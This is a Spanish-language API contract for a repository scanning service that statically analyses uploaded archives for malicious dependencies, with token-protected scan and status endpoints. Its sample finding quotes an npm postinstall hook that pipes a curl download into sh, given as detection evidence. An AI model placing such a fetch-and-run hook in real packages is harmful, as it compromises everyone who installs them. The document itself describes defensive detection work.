# Contrato de API — Repo Scanner (Fase 0 · Solo definición)

> **Estado:** Contrato definido en Fase 0. **No implementado todavía** en `omega/api/main.py`.

## Seguridad y Autenticación

Todos los endpoints del worker forense (`omega/api/`) están protegidos de forma fail-closed por el middleware existente en `omega/api/main.py`:

- **Header obligatorio:** `X-Internal-Service-Token` emitido por `omega/backend-java`.
- **Rechazo sin token o token inválido:** `401 Unauthorized` (`Acceso denegado: X-Internal-Service-Token ausente o inválido`).
- **Aislamiento:** el cliente frontend/desktop nunca llama directamente a `/api/repo/scan`; toda petición pasa por `backend-java` autenticado con JWT + RBAC + perfil `DEVELOPER`.

---

## `POST /api/repo/scan`

Inicia un análisis estático **en RAM/tmpfs** de un archivo comprimido o snapshot de repositorio previamente validado por `archive_safety.py`.

### Headers
- `X-Internal-Service-Token: <token_interno>`
- `Content-Type: application/json` (o `multipart/form-data` en el flujo de subida)

### Request (`ScanRequest` en `omega/api/schemas.py`)
```json
{
  "tenant_id": "devsec-lab",
  "source_type": "archive_upload",
  "ecosystems": ["npm", "pypi", "maven"],
  "max_files": 5000,
  "max_bytes": 52428800,
  "timeout_seconds": 30
}
```

### Response `202 Accepted` (`ScanStatus`)
```json
{
  "scan_id": "scan_01J...",
  "status": "QUEUED",
  "files_scanned": 0,
  "findings": [],
  "limitations": [],
  "zero_retention_notice": "Análisis estático en RAM/tmpfs; contenido purgado al finalizar."
}
```

---

## `GET /api/repo/scan/{id}`

Consulta el estado y los hallazgos de un escaneo efímero en memoria.

### Headers
- `X-Internal-Service-Token: <token_interno>`

### Response `200 OK` (`ScanStatus`)
```json
{
  "scan_id": "scan_01J...",
  "status": "COMPLETED",
  "files_scanned": 142,
  "findings": [
    {
      "rule_id": "NPM-POSTINSTALL-EXEC-01",
      "severity": "HIGH",
      "confidence": 0.92,
      "evidence": "\"postinstall\": \"curl -s https://... | sh\"",
      "location": "package.json:14",
      "explanation": "El script postinstall descarga y ejecuta un payload remoto durante npm install."
    }
  ],
  "limitations": [],
  "zero_retention_notice": "Análisis estático en RAM/tmpfs; contenido purgado al finalizar."
}
```

### Errores esperados
- `401 Unauthorized`: `X-Internal-Service-Token` ausente o inválido.
- `404 Not Found`: `scan_id` inexistente o purgado por expiración (zero-retention).
- `413 Payload Too Large`: archivo excede `max_bytes` o `max_files` en `archive_safety.py`.
- `429 Too Many Requests`: límite de tasa excedido por tenant.
